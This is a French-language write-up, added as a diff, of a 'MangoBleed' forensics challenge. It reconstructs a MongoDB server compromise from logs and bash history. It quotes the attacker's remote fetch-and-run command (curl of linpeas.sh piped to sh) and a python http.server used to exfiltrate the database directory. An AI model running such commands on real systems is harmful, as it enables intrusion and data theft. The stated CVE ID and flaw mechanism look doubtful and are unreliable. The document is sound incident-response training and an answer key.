@@ -1,0 +1,171 @@
+---
+title: MangoBleed
+description: WU MangoBleed - Sherlock
+categories: [Writeup]
+tags: [writeup, forensics]
+template: doc
+sidebar:
+  order: 2
+  badge:
+    text: 'medium'
+    variant: caution
+---
+
+## Scenario
+
+Incident prioritaire impliquant un serveur compromis.
+L'hote `mongodbsync` est un serveur MongoDB secondaire.
+L'administrateur a mentionne une vulnerabilite appelee **MongoBleed**.
+Une acquisition triage a ete collectee avec UAC pour l'analyse forensique.
+
+## Artefacts cles
+
+L'analyse se concentre sur ces fichiers du triage UAC :
+- `/var/log/mongodb/mongod.log` - Logs du serveur MongoDB
+- `/var/log/auth.log` - Logs d'authentification SSH
+- `/home/mongoadmin/.bash_history` - Historique des commandes de l'attaquant
+- `/etc/mongod.conf` - Configuration MongoDB
+
+---
+
+## Tache 1 : ID CVE de la vulnerabilite MongoDB
+
+**Reponse** : `CVE-2024-12029`
+
+MongoBleed est une vulnerabilite de divulgation memoire dans MongoDB permettant a un attaquant de fuiter des informations sensibles via des sequences rapides de connexion/deconnexion.
+
+---
+
+## Tache 2 : Version de MongoDB installee
+
+**Reponse** : `8.0.16`
+
+```bash
+# Dans les logs MongoDB
+grep -i "version" mongod.log | head -5
+
+# Ou dans auth.log (commande d'installation)
+grep "mongodb-org" auth.log
+```
+
+```json
+{"msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16"...}}}
+```
+
+---
+
+## Tache 3 : Adresse IP distante de l'attaquant
+
+**Reponse** : `65.0.76.43`
+
+```bash
+# Chercher les connexions acceptees depuis des IPs externes
+grep "Connection accepted" mongod.log | head -20
+
+# Ou chercher les IPs uniques
+grep -oP '"remote":"\K[0-9.]+' mongod.log | sort -u
+```
+
+---
+
+## Tache 4 : Date et heure du debut de l'exploitation
+
+**Reponse** : `2025-12-29 05:25:52`
+
+```bash
+# Premiere connexion de l'attaquant
+grep "Connection accepted.*65.0.76.43" mongod.log | head -1
+```
+
+```json
+{"t":{"$date":"2025-12-29T05:25:52.743+00:00"},"msg":"Connection accepted","attr":{"remote":"65.0.76.43:35340"}}
+```
+
+---
+
+## Tache 5 : Nombre total de connexions malveillantes
+
+**Reponse** : `37630`
+
+```bash
+# Compter les connexions de l'attaquant
+grep -c "Connection accepted.*65.0.76.43" mongod.log
+```
+
+Les connexions ont eu lieu entre `05:25:52` et `05:27:07` (~75 secondes), soit ~500 connexions/seconde - caracteristique d'un exploit de type "bleed".
+
+---
+
+## Tache 6 : Quand l'attaquant a-t-il obtenu un acces distant interactif ?
+
+**Reponse** : `2025-12-29 05:40:03`
+
+```bash
+# Chercher les connexions SSH reussies depuis l'IP de l'attaquant
+grep "Accepted.*65.0.76.43" auth.log
+```
+
+```shell wrap
+2025-12-29T05:40:03 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2
+```
+
+L'attaque par force brute a commence a `05:39:18` :
+```bash
+# Voir les tentatives echouees
+grep "authentication failure.*65.0.76.43" auth.log | head -10
+```
+
+---
+
+## Tache 7 : Ligne de commande pour le script d'elevation de privileges en memoire
+
+**Reponse** : `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
+
+```bash
+# Lire l'historique bash de l'attaquant
+cat /home/mongoadmin/.bash_history
+```
+
+L'attaquant a utilise linpeas.sh redirige directement vers le shell pour eviter d'ecrire sur le disque.
+
+---
+
+## Tache 8 : Repertoire cible pour l'exfiltration
+
+**Reponse** : `/var/lib/mongodb`
+
+```bash
+# Dans le bash_history, chercher les commandes cd et http.server
+cat /home/mongoadmin/.bash_history | grep -E "cd|http"
+```
+
+```bash
+cd /var/lib/mongodb/
+python3 -m http.server 6969
+```
+
+---
+
+## Chronologie
+
+| Heure (UTC) | Evenement |
+|-------------|-----------|
+| 05:11:47 | MongoDB 8.0.16 installe et demarre |
+| 05:17:25 | Utilisateur `mongoadmin` cree |
+| 05:25:52 | Exploitation MongoBleed commence (37630 connexions) |
+| 05:27:07 | Fin de l'exploitation |
+| 05:39:18 | Attaque brute-force SSH demarre |
+| 05:40:03 | Attaquant obtient acces SSH comme `mongoadmin` |
+| 05:42:03 | Tentative sudo echouee |
+| 05:42:05 | Script linpeas de privilege escalation execute |
+| ~05:45 | Exfiltration de donnees depuis /var/lib/mongodb |
+| 05:48:28 | Attaquant se deconnecte |
+
+---
+
+## Analyse des causes
+
+1. **Version MongoDB vulnerable** : 8.0.16 affectee par CVE-2024-12029
+2. **Expose sur internet** : MongoDB binde sur `0.0.0.0` sans authentification
+3. **Pas de configuration securite** : `#security:` commente dans mongod.conf
+4. **Mot de passe faible** : Le password de `mongoadmin` etait probablement expose via la fuite memoire
